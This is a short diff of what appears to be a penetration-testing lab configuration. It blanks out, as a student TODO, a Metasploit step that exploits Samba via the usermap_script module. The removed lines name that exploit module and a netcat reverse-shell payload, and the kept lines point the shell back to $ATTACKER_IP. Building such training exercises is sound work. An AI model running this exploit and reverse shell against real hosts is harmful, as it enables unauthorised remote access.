@@ -15,12 +15,11 @@ commands:
 
   # TODO: Run the Samba exploit module.
   # Fill in the module name (cmd), RHOSTS, and the reverse shell callback details.
-  # Hint: the Metasploit module is exploit/multi/samba/usermap_script
-  # Choose a payload - cmd/unix/reverse_netcat or cmd/unix/reverse are reliable.
+  # Choose a payload
   - type: msf-module
-    cmd: exploit/multi/samba/usermap_script
+    cmd: # TODO
     creates_session: samba_shell
-    payload: cmd/unix/reverse_netcat
+    payload: # TODO
     payload_options:
       LHOST: $ATTACKER_IP
       LPORT: $LPORT
